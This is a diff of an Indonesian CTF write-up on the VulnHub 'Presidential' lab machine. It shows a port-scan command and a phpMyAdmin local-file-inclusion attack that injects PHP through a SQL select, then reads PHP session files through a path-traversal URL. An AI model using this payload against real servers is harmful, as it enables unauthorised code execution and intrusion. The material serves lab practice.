@@ -25,7 +25,7 @@ gw coba satu" dan akhirnya ketemu juga `192.168.172.134`.
 kali ini gw makenya [RustScan](https://github.com/RustScan/RustScan) karena biar agak cepet dikit.<br/>
 
 ```bash
-root@skofos]:~/Desktop/vh/presidential# rustscan -T 1500 192.168.172.134 -- -A -sC -sV -oN presidential.scan
+[root@skofos]:~/Desktop/vh/presidential# rustscan -T 1500 192.168.172.134 -- -A -sC -sV -oN presidential.scan
 
      _____           _    _____                                                                                                                                                               
     |  __ \         | |  / ____|                                                                                                                                                              
@@ -180,6 +180,9 @@ lalu, setelah gw dpt langsung coba. eh masuknya malah ke *mercusuar* kan gblk. j
 
 ![img5](https://i.ibb.co/qRKkgbY/searchsploit.png)
 
+lalu setelah gw masuk ke panelnya gw dapet sesuatu menarik yaitu, nama user dan password yang terenkripsi (bcrypt / blowfish).
+
+
 # Exploit
 ## Local File Inclusion
 
@@ -187,7 +190,9 @@ menurut [exploit](https://www.exploit-db.com/exploits/44928)nya pertama tama gw 
 ```php
 select '<?php phpInfo();exit;?>'
 ```
+
 terus katanya masukin juga payload buat baca session file gitu.
 ```php
-http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_(cookie session, kalo g tau letak cookie pake extension di browser namanya CookieEditor)
+http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_(cookie session, kalo g tau letak cookie pake extension di browser namanya CookieEditor)
 ```
+pas gw masukin gitu, keluarlah cookie
